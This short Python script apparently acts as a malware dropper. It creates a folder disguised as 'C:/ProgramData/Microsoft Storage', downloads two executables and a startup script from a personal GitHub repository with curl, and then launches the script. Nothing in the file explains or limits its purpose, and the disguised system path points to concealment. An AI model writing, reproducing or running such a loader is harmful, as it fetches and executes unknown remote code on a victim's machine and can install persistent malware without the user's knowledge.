import os

directory = "C:/ProgramData/Microsoft Storage"
os.makedirs(directory, exist_ok=True)
os.chdir(directory)


os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/clo.exe")
os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/file.exe")
os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")

os.system("start startup.py")
